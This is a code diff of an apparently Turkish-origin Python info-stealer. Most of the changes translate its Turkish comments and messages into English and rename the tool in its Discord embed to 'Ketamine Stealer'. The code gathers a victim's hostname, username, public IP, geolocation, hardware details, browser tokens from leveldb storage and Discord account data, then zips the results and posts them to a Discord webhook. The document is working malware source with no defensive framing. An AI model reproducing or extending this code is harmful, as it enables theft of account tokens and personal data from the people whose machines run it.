@@ -1311,7 +1311,7 @@ def collect_system_info(output_path=None, webhook_url=None):
         except:
             system_info["network_connections"] = "Could not determine"
         
-        # Sistemde BIOS türü/versiyonu (Windows'a özel)
+        # BIOS type/version in the system (specific to Windows)
         if platform.system() == "Windows":
             try:
                 bios_info = subprocess.check_output("wmic bios get Manufacturer,Name,Version /format:list", shell=True).decode()
@@ -1323,47 +1323,47 @@ def collect_system_info(output_path=None, webhook_url=None):
             except:
                 system_info["bios"] = "Could not determine"
         
-        # Dosyaya kaydet ve webhook'a gönder
+        # Save to file and send to webhook
         json_data = json.dumps(system_info, indent=4)
         
-        # Dosyaya kaydet
+        # Save to file
         try:
             with open(output_path, "w") as f:
                 f.write(json_data)
-            print(f"Sistem bilgileri kaydedildi: {output_path}")
+            print(f"System information saved: {output_path}")
         except:
-            print(f"Dosya kaydedilemedi: {output_path}")
+            print(f"Could not save file: {output_path}")
         
-        # Webhook'a gönder
+        # Send to webhook
         if webhook_url:
             try:
-                # Webhook için veri boyutu çok büyükse, önemli bilgileri filtrele
+                # If the data size is too large for the webhook, filter important information
                 send_data = {
                     "hostname": system_info.get("hostname", "Unknown"),
                     "os": system_info.get("os", "Unknown"),
                     "ip": system_info.get("public_ip", "Unknown"),
                     "user": system_info.get("user", "Unknown"),
                     "geolocation": system_info.get("geolocation", "Unknown"),
-                    "cpu": system_info.get("cpu", "Unknown"),
-                    "memory": system_info.get("memory", "Unknown")
+                    "cpu": system_info.get('cpu', 'Unknown'),
+                    "memory": system_info.get('memory', 'Unknown')
                 }
                 
-                # Discord webhook için
+                # For Discord webhook
                 if "discord.com" in webhook_url:
                     payload = {
-                        "content": f"📊 Sistem Bilgisi: **{system_info['hostname']}**",
+                        "content": f"📊 System Information: **{system_info['hostname']}**",
                         "embeds": [
                             {
-                                "title": "🖥️ Sistem Raporu",
-                                "description": f"**Kullanıcı**: {system_info['user']}\n**IP**: {system_info['ip']}",
+                                "title": "🖥️ System Report",
+                                "description": f"**User**: {system_info['user']}\n**IP**: {system_info['ip']}",
                                 "color": 5814783,
                                 "fields": [
-                                    {"name": "💻 İşletim Sistemi", "value": system_info['os'], "inline": True},
-                                    {"name": "📍 Konum", "value": f"{system_info['geolocation']['city']}, {system_info['geolocation']['country']}", "inline": True},
+                                    {"name": "💻 Operating System", "value": system_info['os'], "inline": True},
+                                    {"name": "📍 Location", "value": f"{system_info['geolocation']['city']}, {system_info['geolocation']['country']}", "inline": True},
                                     {"name": "⚙️ CPU", "value": system_info.get('cpu', 'Unknown'), "inline": True},
                                     {"name": "🧠 RAM", "value": system_info.get('memory', 'Unknown'), "inline": True}
                                 ],
-                                "footer": {"text": f"Toplama Zamanı: {system_info['timestamp']}"}
+                                "footer": {"text": f"Time: {system_info['timestamp']}"}
                             }
                         ],
                         "attachments": []
@@ -1378,9 +1378,9 @@ def collect_system_info(output_path=None, webhook_url=None):
                     # Genel webhook
                     response = requests.post(webhook_url, json=send_data, timeout=10)
                 
-                print(f"Webhook başarıyla gönderildi: {response.status_code}")
+                print(f"Webhook send successfully: {response.status_code}")
             except Exception as e:
-                print(f"Webhook gönderilemedi: {str(e)}")
+                print(f"Webhook send failed: {str(e)}")
         
         return True
     except Exception as e:
@@ -1451,11 +1451,11 @@ def main():
         embed_data = {
             'embeds': [{
                 'title': '***Santa come early this year !***',
-                'description': f'```yaml\nKullanıcı: {username}\nPC Adı: {computer_name}\nIP: {ip}\nToplanan Veri: {success_count} tarayıcıdan veri alındı\n```',
+                'description': f'```yaml\nUser: {username}\nComputer name: {computer_name}\nIP: {ip}\nTotal information: {success_count} browser information\n```',
                 'color': 3092790,
-                'footer': {'text': 'Homos LLC.'}
+                'footer': {'text': 'Ketamine Stealer.'}
             }],
-            'username': 'Captain Save A Hoe',
+            'username': 'Ketamine',
             'avatar_url': 'https://images-ext-1.discordapp.net/external/0bSNXLXnP_O375r6UNUoIzmXlqa9wpn2w25om5FNAqo/%3Fsize%3D240/https/cdn.discordapp.com/avatars/1321200380629221396/505b6577b9947a137760298848b96a99.webp?format=webp'
         }
         
@@ -1465,7 +1465,7 @@ def main():
             browser_tokens = get_tokens_from_leveldb()
             tokens_str = '\n'.join(browser_tokens) if browser_tokens else 'Bulunamadı'
             
-            discord_field = f"Discord ID: {discord_info.get('id')}\nKullanıcı Adı: {discord_info.get('username')}\nLonca Etiketi: {discord_info.get('tag') or 'Bulunamadı'}\nTarayıcı Tokenları:\n{tokens_str}"
+            discord_field = f"Discord ID: {discord_info.get('id')}\nKullanıcı Adı: {discord_info.get('username')}\nGuild tag: {discord_info.get('tag') or 'doesnt find'}\nBrowser Tokens:\n{tokens_str}"
             
             embed_data['embeds'][0]['description'] += f"\n\n**Discord Bilgileri**\n```yaml\n{discord_field}\n```"
             
@@ -1481,7 +1481,7 @@ def main():
         
         send_data_with_embed(webhook_url, zip_file_path, embed_data)
     except Exception as e:
-        print(f'Veri toplama ve gönderme işlemi sırasında hata oluştu: {str(e)}')
+        print(f'Error in sending information: {str(e)}')
 
 if __name__ == '__main__':
     main()
